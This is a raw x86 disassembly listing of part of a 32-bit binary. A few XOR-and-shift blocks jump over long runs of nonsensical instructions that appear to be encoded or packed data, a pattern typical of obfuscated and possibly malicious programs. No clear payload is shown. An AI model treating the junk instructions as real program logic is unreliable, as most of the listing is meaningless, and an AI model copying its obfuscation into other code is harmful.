  40c363:	mov    ecx,DWORD PTR [ebp-0x14]
  40c366:	mov    edx,DWORD PTR [ebp-0x18]
  40c369:	mov    esi,DWORD PTR [ebp-0x14]
  40c36c:	shrd   eax,ecx,0x2
  40c370:	shl    edx,0x1e
  40c373:	mov    edx,DWORD PTR ds:0x422598
  40c379:	mov    edx,DWORD PTR [edx+0x1a8]
  40c37f:	shr    ecx,0x2
  40c382:	xor    esi,esi
  40c384:	mov    ecx,0x329e695d
  40c389:	xor    eax,ecx
  40c38b:	or     eax,esi
  40c38d:	mov    DWORD PTR [edx],eax
  40c38f:	mov    eax,DWORD PTR [ebp-0x18]
  40c392:	mov    edx,DWORD PTR [ebp-0x14]
  40c395:	shrd   eax,edx,0x2
  40c399:	shr    edx,0x2
  40c39c:	mov    edx,DWORD PTR [ebp-0x18]
  40c39f:	mov    esi,DWORD PTR [ebp-0x14]
  40c3a2:	xor    eax,ecx
  40c3a4:	xor    esi,esi
  40c3a6:	or     eax,esi
  40c3a8:	mov    ds:0x4227ac,eax
  40c3ad:	mov    BYTE PTR [ebp-0x2],0x4f
  40c3b1:	mov    BYTE PTR [ebp-0x1],0xf9
  40c3b5:	movzx  eax,BYTE PTR [ebp-0x1]
  40c3b9:	shl    edx,0x1e
  40c3bc:	mov    dl,BYTE PTR [ebp-0x2]
  40c3bf:	jmp    0x40c7b5
  40c3c4:	(bad)  
  40c3c5:	xor    al,0x5b
  40c3c7:	mov    dl,0x5b
  40c3c9:	call   0x6af2:0x3fac243e
  40c3d0:	into   
  40c3d1:	enter  0xb0ad,0xd
  40c3d5:	std    
  40c3d6:	sbb    BYTE PTR [eax],bl
  40c3d8:	outs   dx,BYTE PTR ds:[esi]
  40c3d9:	adc    bl,BYTE PTR [eax]
  40c3db:	sbb    BYTE PTR [ecx+0x723160a1],ch
  40c3e1:	aad    0x2d
  40c3e3:	dec    ecx
  40c3e4:	mov    BYTE PTR [eax],al
  40c3e6:	xchg   esp,eax
  40c3e7:	or     eax,DWORD PTR [ecx]
  40c3e9:	outs   dx,BYTE PTR ds:[esi]
  40c3ea:	cld    
  40c3eb:	xor    esi,DWORD PTR [eax-0xf]
  40c3ee:	and    edi,esp
  40c3f0:	data16 fstp TBYTE PTR [ecx-0x36e1d5c9]
  40c3f7:	leave  
  40c3f8:	rcl    BYTE PTR [ecx+0x78],0xed
  40c3fc:	rcl    edi,1
  40c3fe:	pop    edx
  40c3ff:	push   ebx
  40c400:	push   edx
  40c401:	lods   eax,DWORD PTR ss:[esi]
  40c403:	xor    DWORD PTR [edi-0x57],0x996f8205
  40c40a:	inc    ebx
  40c40b:	out    dx,al
  40c40c:	mov    ch,0xed
  40c40e:	in     al,dx
  40c40f:	add    BYTE PTR [ebx-0x603e6642],cl
  40c415:	aad    0x32
  40c417:	retf   0xadc
  40c41a:	pusha  
  40c41b:	xchg   BYTE PTR [ecx+0x49892b0],ch
  40c421:	inc    ebx
  40c422:	std    
  40c423:	lea    edi,ds:0x9abfc86c
  40c429:	jg     0x40c402
  40c42b:	mov    DWORD PTR [edx-0x6f],ecx
  40c42e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c42f:	jp     0x40c443
  40c431:	cmp    eax,0x3e6b0c97
  40c436:	fist   WORD PTR [ecx]
  40c438:	sbb    DWORD PTR [ebx],eax
  40c43a:	lea    ebx,[eax-0x3e2d01db]
  40c440:	neg    DWORD PTR [ecx]
  40c442:	les    edi,FWORD PTR [ebx]
  40c444:	xor    al,BYTE PTR [esi-0x6b559308]
  40c44a:	jg     0x40c489
  40c44c:	cwde   
  40c44d:	add    al,0x40
  40c44f:	in     eax,dx
  40c450:	jbe    0x40c3de
  40c452:	lods   al,BYTE PTR ds:[esi]
  40c453:	and    ebp,ebx
  40c455:	ins    DWORD PTR es:[edi],dx
  40c456:	shr    BYTE PTR [edx+0x4a],1
  40c459:	sbb    esi,DWORD PTR [eax+0x4b]
  40c45c:	pop    ecx
  40c45d:	cmp    DWORD PTR [ecx+0xc],edx
  40c460:	xchg   bh,ah
  40c462:	pop    edi
  40c463:	jns    0x40c422
  40c465:	sbb    dl,BYTE PTR [edi]
  40c467:	or     BYTE PTR [eax-0x2caabc6],0x20
  40c46e:	xchg   edi,eax
  40c46f:	addr16 nop
  40c471:	(bad)  
  40c472:	or     dh,BYTE PTR [edi-0x2d07aca4]
  40c478:	push   cs
  40c479:	retf   0x8a89
  40c47c:	dec    ecx
  40c47d:	dec    edx
  40c47e:	dec    esp
  40c47f:	adc    al,0x46
  40c481:	and    ch,ch
  40c483:	sub    edi,DWORD PTR [edx]
  40c485:	push   0xf2ef6733
  40c48a:	push   edx
  40c48b:	inc    edx
  40c48c:	sahf   
  40c48d:	and    ah,BYTE PTR [ebx+0x71]
  40c490:	mov    edx,?
  40c492:	inc    esp
  40c493:	jge    0x40c510
  40c495:	xchg   BYTE PTR [ebx-0x16],ch
  40c498:	in     eax,0xdf
  40c49a:	dec    esp
  40c49b:	xor    ebp,edi
  40c49d:	add    cl,BYTE PTR [edx-0x1d]
  40c4a0:	retf   0x6b3f
  40c4a3:	sbb    ah,BYTE PTR [eax-0x665e3896]
  40c4a9:	jmp    0xc808:0xd5959f40
  40c4b0:	cld    
  40c4b1:	rol    BYTE PTR [ebx],cl
  40c4b3:	jle    0x40c499
  40c4b5:	sub    al,0xae
  40c4b7:	dec    esi
  40c4b8:	push   ds
  40c4b9:	vpsubsw xmm5,xmm7,xmm0
  40c4bd:	sub    eax,0xb324edc3
  40c4c2:	push   ds
  40c4c3:	pop    ebx
  40c4c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4c5:	jno    0x40c464
  40c4c7:	sub    DWORD PTR [eax+0x1f],esi
  40c4ca:	and    eax,0x2abe31ed
  40c4cf:	pop    esi
  40c4d0:	(bad)  
  40c4d1:	out    0x8,eax
  40c4d3:	xor    ebx,DWORD PTR [ecx+0x1b]
  40c4d6:	imul   esi,DWORD PTR [edx],0xffffffd7
  40c4d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c4da:	(bad)  
  40c4db:	nop
  40c4dc:	pushf  
  40c4dd:	loopne 0x40c547
  40c4df:	loop   0x40c50a
  40c4e1:	leave  
  40c4e2:	sbb    ebp,DWORD PTR [edx-0x20]
  40c4e5:	xchg   ebx,eax
  40c4e6:	inc    edx
  40c4e7:	addr16 (bad) 
  40c4e9:	js     0x40c48a
  40c4eb:	das    
  40c4ec:	xchg   ebx,eax
  40c4ed:	into   
  40c4ee:	data16 jg 0x40c524
  40c4f1:	sub    cl,BYTE PTR [esi-0x1efe8262]
  40c4f7:	dec    esi
  40c4f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4f9:	inc    eax
  40c4fa:	pop    edx
  40c4fb:	add    al,0x46
  40c4fd:	in     eax,dx
  40c4fe:	pop    ecx
  40c4ff:	in     eax,dx
  40c500:	js     0x40c4e4
  40c502:	dec    ebx
  40c503:	sub    bh,BYTE PTR [esi-0xc]
  40c506:	and    dh,BYTE PTR [esi+0x26e2f325]
  40c50c:	mov    WORD PTR [esi],gs
  40c50e:	pop    ss
  40c50f:	mov    esi,0x3698a4ae
  40c514:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c515:	js     0x40c4c8
  40c517:	mov    ah,0xd7
  40c519:	xor    ebx,esp
  40c51b:	add    BYTE PTR [ecx+0x5aad3eb8],0x90
  40c522:	ds ins BYTE PTR es:[edi],dx
  40c524:	fisubr WORD PTR [edi]
  40c526:	test   BYTE PTR ds:0x71448dcd,dh
  40c52c:	stos   DWORD PTR es:[edi],eax
  40c52d:	mov    ds:0x5fb6cf8f,al
  40c532:	sbb    eax,0x6587ab9c
  40c537:	push   ecx
  40c538:	mov    eax,0xbbe2b93a
  40c53d:	inc    edx
  40c53e:	adc    BYTE PTR [esi+0xc],ah
  40c541:	div    DWORD PTR [ecx]
  40c543:	hlt    
  40c544:	retf   0x89ac
  40c547:	je     0x40c56a
  40c549:	or     BYTE PTR [edi-0x3a],0x1c
  40c54d:	stc    
  40c54e:	mov    al,0x43
  40c550:	shl    ch,1
  40c552:	inc    eax
  40c553:	mov    esp,0x82fd7a2c
  40c558:	fidiv  WORD PTR [ebx+ebx*8]
  40c55b:	std    
  40c55c:	mov    dl,cl
  40c55e:	jmp    0x9257a4d4
  40c563:	mov    bh,0x2b
  40c565:	xchg   edx,eax
  40c566:	(bad)  
  40c567:	mov    ebx,0xcd3f57d6
  40c56c:	jg     0x40c50a
  40c56e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c56f:	or     esp,DWORD PTR [ecx-0x4d]
  40c572:	aam    0xca
  40c574:	imul   edi,DWORD PTR [edx+0x6ec41f7c],0x5c4cfeb
  40c57e:	retf   0xc74b
  40c581:	push   0xffffffeb
  40c583:	jbe    0x40c5b1
  40c585:	add    al,0xc7
  40c587:	dec    eax
  40c588:	pop    edx
  40c589:	sub    BYTE PTR [ebx],0x91
  40c58c:	sub    ah,cl
  40c58e:	adc    BYTE PTR [ebx],al
  40c590:	fcom   QWORD PTR [ebp-0x21]
  40c593:	adc    ecx,DWORD PTR [esi]
  40c595:	call   esi
  40c597:	sbb    al,BYTE PTR [ebp+0xe809008]
  40c59d:	cmp    al,cl
  40c59f:	push   ds
  40c5a0:	push   eax
  40c5a1:	pop    ecx
  40c5a2:	lock jbe 0x40c5c6
  40c5a5:	test   al,0x8b
  40c5a7:	mov    edi,gs
  40c5a9:	jge    0x40c546
  40c5ab:	dec    edi
  40c5ac:	(bad)  
  40c5ad:	cs (bad) 
  40c5af:	neg    BYTE PTR [ecx]
  40c5b1:	loop   0x40c62f
  40c5b3:	mov    dl,0x7f
  40c5b5:	sbb    eax,0x9c9a183b
  40c5ba:	stos   BYTE PTR es:[edi],al
  40c5bb:	shl    DWORD PTR gs:[ecx],0x6e
  40c5bf:	mov    esp,DWORD PTR [eax-0x6]
  40c5c2:	xchg   ecx,eax
  40c5c3:	dec    ebp
  40c5c4:	cdq    
  40c5c5:	(bad)  
  40c5c6:	(bad)  
  40c5c7:	lods   eax,DWORD PTR ds:[esi]
  40c5c8:	pop    ecx
  40c5c9:	gs mov ebx,0x36e24387
  40c5cf:	xor    DWORD PTR [esi+0x2],edi
  40c5d2:	mov    ecx,0x79ffe040
  40c5d7:	add    eax,0x3229c468
  40c5dc:	push   es
  40c5dd:	sbb    al,0xcb
  40c5df:	jmp    0xf40e4587
  40c5e4:	adc    al,BYTE PTR [eax-0x416b9a91]
  40c5ea:	das    
  40c5eb:	imul   esp,DWORD PTR [esi+0x7e7b3ad9],0xfffffffc
  40c5f2:	adc    edi,DWORD PTR [esi+0x1c]
  40c5f5:	or     ecx,DWORD PTR [esi-0x5141f98d]
  40c5fb:	inc    esi
  40c5fc:	add    al,ch
  40c5fe:	rol    BYTE PTR [ebp+0x3e],1
  40c601:	pop    edx
  40c602:	neg    BYTE PTR [edx+0x9]
  40c605:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c606:	jbe    0x40c657
  40c608:	xor    BYTE PTR [ebx+0x26],bh
  40c60b:	and    eax,0xc54966a2
  40c610:	into   
  40c611:	dec    ecx
  40c612:	lock pop ebp
  40c614:	sub    al,0xb9
  40c616:	add    BYTE PTR [edi],al
  40c618:	xlat   BYTE PTR ds:[ebx]
  40c619:	std    
  40c61a:	adc    al,0x12
  40c61c:	or     eax,0x9f75d0a4
  40c621:	test   DWORD PTR [esi+0x22],edi
  40c624:	mov    ecx,0xdc8c0ffe
  40c629:	data16 int3 
  40c62b:	cwde   
  40c62c:	rol    esi,cl
  40c62e:	jge    0x40c5ba
  40c630:	and    bl,BYTE PTR [ebp-0x7b50bcd4]
  40c636:	and    BYTE PTR [edx+0x494c6a7e],bh
  40c63c:	hlt    
  40c63d:	adc    cl,ah
  40c63f:	aam    0xed
  40c641:	ret    
  40c642:	dec    ebp
  40c643:	cmp    ebx,ecx
  40c645:	sti    
  40c646:	sbb    al,0xa6
  40c649:	jle    0x40c616
  40c64b:	sub    edx,DWORD PTR [ebx+0x205de05e]
  40c651:	mov    eax,0x8ab17146
  40c656:	lods   eax,DWORD PTR ds:[esi]
  40c657:	jbe    0x40c65a
  40c659:	mov    ch,al
  40c65b:	and    DWORD PTR [esi],ecx
  40c65d:	mov    DWORD PTR [eax-0x39],ebp
  40c660:	pop    esp
  40c661:	jmp    0xcab8:0x6c3e945c
  40c668:	push   es
  40c669:	sub    eax,0x560608c0
  40c66f:	repz and ebp,DWORD PTR [ecx-0x11]
  40c673:	clc    
  40c674:	sub    ah,BYTE PTR [esi+0x531e71fc]
  40c67a:	and    DWORD PTR [eax],edi
  40c67c:	loope  0x40c6b1
  40c67e:	js     0x40c651
  40c680:	pop    ss
  40c681:	sar    BYTE PTR [edx],cl
  40c683:	mov    gs,WORD PTR [eax]
  40c685:	mov    ebp,fs
  40c687:	jecxz  0x40c6ea
  40c689:	out    0x84,eax
  40c68b:	fidiv  WORD PTR [edx-0x33]
  40c68e:	ins    DWORD PTR es:[edi],dx
  40c68f:	sbb    BYTE PTR [ebp+0x30],ch
  40c692:	cwde   
  40c693:	popa   
  40c694:	pop    esi
  40c695:	and    al,0x27
  40c697:	shr    BYTE PTR [esi-0x20],cl
  40c69a:	jp     0x40c6ee
  40c69c:	in     eax,0x8
  40c69e:	enter  0x185,0x62
  40c6a2:	call   0x8d97:0xa82580ba
  40c6a9:	push   ebp
  40c6aa:	retf   
  40c6ab:	sub    ch,bh
  40c6ad:	cmp    ebx,DWORD PTR [ecx]
  40c6af:	cli    
  40c6b0:	inc    edi
  40c6b1:	sub    al,0x65
  40c6b3:	sahf   
  40c6b4:	sbb    al,0x13
  40c6b6:	ficomp DWORD PTR [ecx]
  40c6b8:	mov    dl,0x22
  40c6ba:	inc    esi
  40c6bb:	sbb    al,0x2f
  40c6bd:	mov    DWORD PTR [ebp-0x72],ebp
  40c6c0:	fiadd  WORD PTR [ebx]
  40c6c2:	aad    0x5f
  40c6c4:	popa   
  40c6c5:	mov    ds:0x95fd35d8,eax
  40c6ca:	push   esi
  40c6cb:	adc    eax,0x9b5a4249
  40c6d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c6d1:	jl     0x40c6e9
  40c6d3:	push   ds
  40c6d4:	jo     0x40c664
  40c6d6:	cdq    
  40c6d7:	fdivr  st,st(2)
  40c6d9:	jp     0x40c6a3
  40c6db:	stos   BYTE PTR es:[edi],al
  40c6dc:	add    DWORD PTR [edx],esi
  40c6de:	pminsw mm1,QWORD PTR [esi]
  40c6e1:	push   ecx
  40c6e2:	sbb    BYTE PTR [eax+edi*1-0x3a323b84],cl
  40c6e9:	lea    edi,[ecx+0x49d5d4f6]
  40c6ef:	sbb    al,0x1
  40c6f1:	daa    
  40c6f2:	bnd call 0x63c34a7c
  40c6f8:	adc    BYTE PTR [esp+eax*1],ch
  40c6fb:	dec    esi
  40c6fc:	loopne 0x40c77b
  40c6fe:	(bad)  
  40c6ff:	adc    al,0xe2
  40c701:	mov    ecx,0x572988e3
  40c706:	loop   0x40c731
  40c708:	cdq    
  40c709:	xchg   ebx,eax
  40c70a:	js     0x40c72b
  40c70c:	mov    cl,0x1
  40c70e:	mov    ebx,0x499c3a0
  40c713:	sbb    BYTE PTR [edx+0x6e],ch
  40c716:	mov    al,ds:0xf3f1e5d8
  40c71b:	sub    cl,dl
  40c71d:	ret    0x883a
  40c720:	arpl   WORD PTR [edi+eax*4-0x59],bx
  40c724:	fs add al,0x7b
  40c727:	shr    DWORD PTR [edx-0x5],cl
  40c72a:	mov    ebx,0x1ac250b0
  40c72f:	add    al,0xb9
  40c731:	jns    0x40c750
  40c733:	les    ecx,FWORD PTR [edi+0x519492f7]
  40c739:	dec    ecx
  40c73a:	xchg   ecx,eax
  40c73b:	sub    ecx,0x41
  40c73e:	xchg   ecx,eax
  40c73f:	outs   dx,BYTE PTR ds:[esi]
  40c740:	mov    dl,0x6d
  40c742:	mov    ebp,0xd907c075
  40c747:	dec    edi
  40c748:	outs   dx,BYTE PTR ds:[esi]
  40c749:	cwde   
  40c74a:	inc    ebx
  40c74b:	cmp    DWORD PTR [edi],esi
  40c74d:	mov    eax,0x58da13ad
  40c752:	jb     0x40c7a9
  40c754:	dec    esp
  40c755:	sub    DWORD PTR [eax+0x3669de1a],0xffffffe1
  40c75c:	lock lea ecx,[eax+0x6]
  40c760:	fwait
  40c761:	in     eax,0x71
  40c763:	xchg   esi,eax
  40c764:	and    esp,DWORD PTR [eax]
  40c766:	stc    
  40c767:	pusha  
  40c768:	mov    DWORD PTR [edi+edx*2-0x37a72896],eax
  40c76f:	pushf  
  40c770:	dec    ecx
  40c771:	adc    al,0xc5
  40c773:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c774:	sbb    ebx,DWORD PTR [ebp-0x176331aa]
  40c77a:	push   eax
  40c77b:	aaa    
  40c77c:	out    dx,eax
  40c77d:	and    eax,0x87bd0892
  40c782:	pusha  
  40c783:	js     0x40c7cd
  40c785:	sub    BYTE PTR [ebp+0x4cb69d2e],cl
  40c78b:	xor    eax,0xc7acacd9
  40c790:	inc    edx
  40c791:	inc    eax
  40c792:	shr    DWORD PTR [ebx-0x4265be63],cl
  40c798:	jg     0x40c71f
  40c79a:	cdq    
  40c79b:	push   ebx
  40c79c:	popa   
  40c79d:	push   edx
  40c79e:	fmul   DWORD PTR [ecx-0x44]
  40c7a1:	mov    ds,WORD PTR [esi+0x721316a5]
  40c7a7:	pop    esp
  40c7a8:	cdq    
  40c7a9:	cmp    al,0x22
  40c7ab:	inc    edx
  40c7ac:	retf   0xf588
  40c7af:	mov    ch,0x87
  40c7b1:	daa    
  40c7b2:	jmp    0xc202:0x4234c319
  40c7b9:	push   0x6
  40c7bb:	add    eax,0xfa
  40c7c0:	mov    BYTE PTR [ebp-0x4],al
  40c7c3:	mov    BYTE PTR [ebp-0x3],0x67
  40c7c7:	pop    eax
  40c7c8:	mov    BYTE PTR [ebp-0x1],al
  40c7cb:	mov    BYTE PTR [ebp-0x2],0x3
  40c7cf:	mov    dl,BYTE PTR [ebp-0x2]
  40c7d2:	movzx  esi,dl
  40c7d5:	cdq    
  40c7d6:	idiv   esi
  40c7d8:	mov    dl,BYTE PTR [ebp-0x1]
  40c7db:	add    al,dl
  40c7dd:	mov    dl,BYTE PTR [ebp-0x3]
  40c7e0:	or     al,dl
  40c7e2:	mov    dl,BYTE PTR [ebp-0x4]
  40c7e5:	add    al,0x3a
  40c7e7:	cmp    dl,al
  40c7e9:	jmp    0x40cbdf
  40c7ee:	xchg   esi,eax
  40c7ef:	and    al,dl
  40c7f1:	cmc    
  40c7f2:	mov    ds:0xdc222674,al
  40c7f7:	mov    cl,BYTE PTR [edi-0x32ac7a90]
  40c7fd:	jo     0x40c862
  40c7ff:	cmc    
  40c800:	sbb    BYTE PTR [eax],bl
  40c802:	outs   dx,BYTE PTR ds:[esi]
  40c803:	adc    bl,BYTE PTR [eax]
  40c805:	sbb    BYTE PTR [edi],cl
  40c807:	repnz fidiv DWORD PTR [eax]
  40c80a:	jmp    0x40c85e
  40c80c:	push   cs
  40c80d:	iret   
  40c80e:	jl     0x40c7a0
  40c810:	dec    edi
  40c811:	pop    edx
  40c812:	jbe    0x40c815
  40c814:	scas   eax,DWORD PTR es:[edi]
  40c815:	xor    eax,0xe48148ee
  40c81a:	cld    
  40c81b:	xchg   edi,eax
  40c81c:	sub    al,0xcb
  40c81e:	into   
  40c81f:	pop    ebp
  40c820:	out    dx,al
  40c821:	scas   eax,DWORD PTR es:[edi]
  40c822:	ins    DWORD PTR es:[edi],dx
  40c823:	clc    
  40c824:	dec    edx
  40c825:	out    dx,al
  40c826:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c827:	aam    0x96
  40c829:	mov    DWORD PTR [ebx-0x16884a8a],edx
  40c82f:	add    esp,edx
  40c831:	inc    ebx
  40c832:	xchg   edx,eax
  40c833:	in     al,dx
  40c834:	mov    edx,0x2553b9c5
  40c839:	rcr    ecx,1
  40c83b:	pusha  
  40c83c:	mov    DWORD PTR [ebp-0x4cebf790],edx
  40c842:	and    ch,al
  40c844:	push   ebp
  40c845:	aas    
  40c846:	adc    al,dl
  40c848:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c849:	cmp    BYTE PTR [esi+0x2f],dh
  40c84c:	push   cs
  40c84d:	or     DWORD PTR ds:0x3e37d489,edx
  40c853:	sub    esp,DWORD PTR [esi]
  40c855:	pop    ecx
  40c856:	mov    cl,0x6e
  40c858:	push   0x828192f
  40c85d:	mov    ?,WORD PTR [esi]
  40c85f:	xor    bl,BYTE PTR [edi+0x41d95278]
  40c865:	sub    BYTE PTR [ecx+0x79e41f29],0x6c
  40c86c:	dec    ecx
  40c86d:	push   edx
  40c86e:	fst    QWORD PTR [esi+eax*4-0x77eab74c]
  40c875:	push   edx
  40c876:	shl    esp,cl
  40c878:	adc    BYTE PTR [ebx-0x6c],al
  40c87b:	add    bh,ch
  40c87d:	mov    edi,0x4922c348
  40c882:	sbb    bh,BYTE PTR [ebx-0x26]
  40c885:	xchg   eax,edi
  40c887:	js     0x40c868
  40c889:	or     BYTE PTR [ebp+0x1b],cl
  40c88c:	mov    esi,0x19ec33bd
  40c891:	inc    esi
  40c892:	test   eax,0xda2b4af7
  40c897:	into   
  40c898:	idiv   DWORD PTR [ebx]
  40c89a:	inc    edi
  40c89b:	mov    eax,ds:0x4a8beb8e
  40c8a0:	inc    edx
  40c8a1:	cmp    ah,BYTE PTR [ebp+0x11]
  40c8a4:	mov    edx,0xba51475e
  40c8a9:	push   edi
  40c8aa:	or     BYTE PTR [eax-0x3],dh
  40c8ad:	cli    
  40c8ae:	jmp    0x40c843
  40c8b0:	add    BYTE PTR [esi+0x16],bh
  40c8b3:	iret   
  40c8b4:	dec    edi
  40c8b5:	scas   al,BYTE PTR es:[edi]
  40c8b6:	daa    
  40c8b7:	inc    esi
  40c8b8:	jle    0x40c8ba
  40c8ba:	pop    ecx
  40c8bb:	test   ch,bh
  40c8bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8be:	pop    edi
  40c8bf:	inc    ebx
  40c8c0:	and    al,0x5c
  40c8c2:	sbb    dl,BYTE PTR [ebx-0x48]
  40c8c5:	and    DWORD PTR [edx],edi
  40c8c7:	loopne 0x40c89f
  40c8c9:	cmp    al,0x4a
  40c8cb:	mov    ah,0xf9
  40c8cd:	cmp    ecx,DWORD PTR ds:0x51b37152
  40c8d3:	mov    BYTE PTR [ebp+0x79293123],dh
  40c8d9:	(bad)  
  40c8db:	popa   
  40c8dc:	in     eax,dx
  40c8dd:	aaa    
  40c8de:	stc    
  40c8df:	mov    bh,0x59
  40c8e1:	jne    0x40c8f0
  40c8e3:	or     eax,0x38c8bfbf
  40c8e8:	mov    ebp,0x67f710f4
  40c8ed:	ins    BYTE PTR es:[edi],dx
  40c8ee:	lock fs inc edi
  40c8f1:	and    esp,edi
  40c8f3:	sub    DWORD PTR [edi],edx
  40c8f5:	cmp    edx,DWORD PTR [ebp-0x74]
  40c8f8:	ret    0xab95
  40c8fb:	mov    ah,0x74
  40c8fd:	mov    dh,0x4f
  40c8ff:	in     eax,dx
  40c900:	or     al,0x3d
  40c902:	ss inc ebx
  40c904:	aam    0x73
  40c906:	inc    esi
  40c907:	pop    ds
  40c908:	jb     0x40c894
  40c90a:	retf   
  40c90b:	popf   
  40c90c:	sahf   
  40c90d:	pop    edi
  40c90e:	les    ebx,FWORD PTR [ebx-0x4a4a9992]
  40c914:	cmc    
  40c915:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c916:	dec    edx
  40c917:	xchg   edx,eax
  40c918:	pop    ss
  40c919:	mov    fs,WORD PTR [ebp-0x40fe4bf0]
  40c91f:	sbb    eax,0xadf1ffc
  40c924:	inc    edi
  40c925:	xchg   edx,eax
  40c926:	mov    ebx,DWORD PTR [ebx]
  40c928:	(bad)  [eax-0x6283cb17]
  40c92e:	in     al,0x6c
  40c930:	cdq    
  40c931:	loop   0x40c8ed
  40c933:	jnp    0x40c994
  40c935:	scas   eax,DWORD PTR es:[edi]
  40c936:	inc    esi
  40c937:	dec    edx
  40c938:	jne    0x40c923
  40c93a:	sub    al,0xeb
  40c93c:	pop    esi
  40c93d:	dec    ebp
  40c93e:	out    0xd,eax
  40c940:	jnp    0x40c998
  40c942:	sbb    al,0xf4
  40c944:	(bad)  
  40c945:	test   ecx,ebp
  40c947:	xchg   ebx,eax
  40c948:	sub    eax,0x1be2c706
  40c94d:	mov    esp,0xee3c1ed7
  40c952:	push   ebp
  40c953:	push   es
  40c954:	mov    ah,0x8f
  40c956:	inc    ebp
  40c957:	scas   al,BYTE PTR es:[edi]
  40c958:	fprem1 
  40c95a:	int    0xa6
  40c95c:	sub    eax,0x95a29cd2
  40c961:	aam    0xfb
  40c963:	jl     0x40c97c
  40c965:	sub    dl,BYTE PTR [ebx-0x10]
  40c968:	mov    DWORD PTR [ecx-0x56234254],eax
  40c96e:	xor    BYTE PTR [ecx+0x3e],bl
  40c971:	in     eax,0xa
  40c973:	lds    ebx,FWORD PTR [ebp+eiz*8-0x1d263da8]
  40c97a:	xchg   ebp,eax
  40c97b:	addr16 aam 0x90
  40c97e:	lahf   
  40c97f:	pop    ss
  40c980:	sub    al,0xac
  40c982:	shr    DWORD PTR [eax+0x1381c969],0xe5
  40c989:	clc    
  40c98a:	in     eax,0x9a
  40c98c:	sbb    DWORD PTR ds:0x2a5e915b,esi
  40c992:	sbb    al,BYTE PTR [esi-0x6d10082]
  40c998:	dec    edi
  40c999:	inc    bp
  40c99b:	(bad)  
  40c99c:	xchg   edx,eax
  40c99d:	mov    al,ds:0x248a4662
  40c9a2:	mov    edi,DWORD PTR [ebp+0x2138466a]
  40c9a8:	pop    edi
  40c9a9:	pushf  
  40c9aa:	(bad)
  40c9ae:	pop    eax
  40c9af:	nop
  40c9b0:	add    al,dh
  40c9b2:	pop    eax
  40c9b3:	mov    ebp,0xdce9899
  40c9b8:	xchg   edx,eax
  40c9b9:	mov    esp,eax
  40c9bb:	jle    0x40ca35
  40c9bd:	ret    0x8a89
  40c9c0:	test   eax,0x7040a8ea
  40c9c5:	(bad)  
  40c9c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9c7:	add    BYTE PTR [edi],ch
  40c9c9:	out    0xb4,al
  40c9cb:	and    ch,BYTE PTR fs:[ecx]
  40c9ce:	scas   eax,DWORD PTR es:[edi]
  40c9cf:	scas   al,BYTE PTR es:[edi]
  40c9d0:	in     al,dx
  40c9d1:	sbb    esi,edx
  40c9d3:	repz jmp 0xa085c76a
  40c9d9:	push   esp
  40c9da:	arpl   sp,sp
  40c9dc:	cld    
  40c9dd:	in     al,0xd9
  40c9df:	push   ss
  40c9e0:	ja     0x40ca4b
  40c9e2:	jmp    0xaa03:0xf09c575f
  40c9e9:	fadd   QWORD PTR [eax]
  40c9eb:	mov    ebx,0x5507c502
  40c9f0:	mov    dh,0xf0
  40c9f2:	aas    
  40c9f3:	dec    edi
  40c9f4:	lods   al,BYTE PTR ds:[esi]
  40c9f5:	xor    ebp,ebp
  40c9f7:	and    dh,BYTE PTR [esi]
  40c9f9:	xlat   BYTE PTR ds:[ebx]
  40c9fa:	repnz pop ebx
  40c9fc:	aad    0xfc
  40c9fe:	ins    BYTE PTR es:[edi],dx
  40c9ff:	gs cli 
  40ca01:	adc    eax,DWORD PTR [ebx+0x21]
  40ca04:	imul   DWORD PTR [esi+0x2b]
  40ca07:	dec    esp
  40ca08:	jl     0x40ca78
  40ca0a:	cmp    DWORD PTR [edx+0x69],0xe75f768b
  40ca11:	jne    0x40ca6a
  40ca13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca14:	pop    edi
  40ca15:	inc    ecx
  40ca16:	jge    0x40ca00
  40ca18:	jo     0x40c9ca
  40ca1a:	cmp    al,0xe4
  40ca1c:	out    dx,eax
  40ca1d:	adc    eax,0xfe364703
  40ca22:	pop    es
  40ca23:	mov    dl,0xf6
  40ca25:	jl     0x40ca7e
  40ca27:	lds    ecx,FWORD PTR [esi+0x1a0af467]
  40ca2d:	(bad)  
  40ca2e:	pusha  
  40ca2f:	cdq    
  40ca30:	or     eax,0x6016803
  40ca35:	add    al,0xc6
  40ca37:	int3   
  40ca38:	les    ebp,FWORD PTR [eax+ebp*4+0x1760d617]
  40ca3f:	and    al,BYTE PTR [eax+0x374fbe37]
  40ca45:	popa   
  40ca46:	out    0x87,al
  40ca48:	sar    BYTE PTR [edi+0x15],cl
  40ca4b:	pop    ds
  40ca4c:	mov    ds:0xc553f90b,eax
  40ca51:	xchg   ebp,eax
  40ca52:	xchg   ebp,eax
  40ca53:	iret   
  40ca54:	mov    ch,0xfb
  40ca56:	pop    esp
  40ca57:	repz loop 0x40ca25
  40ca5a:	(bad)  
  40ca5b:	cs mov dl,0x57
  40ca5e:	and    al,0x83
  40ca60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca61:	push   esp
  40ca62:	sub    al,cl
  40ca64:	(bad)  
  40ca65:	arpl   si,si
  40ca67:	pusha  
  40ca68:	stos   DWORD PTR es:[edi],eax
  40ca69:	cmp    eax,0x92c2527d
  40ca6e:	adc    cl,BYTE PTR ss:[edi]
  40ca71:	pop    edx
  40ca72:	dec    eax
  40ca73:	xchg   ebx,eax
  40ca74:	xor    al,0xf5
  40ca76:	mov    ah,0xde
  40ca78:	inc    ebx
  40ca79:	mov    edx,0xfa9f20b3
  40ca7e:	or     BYTE PTR [edi+0x3a],0xba
  40ca82:	test   BYTE PTR [edx],bh
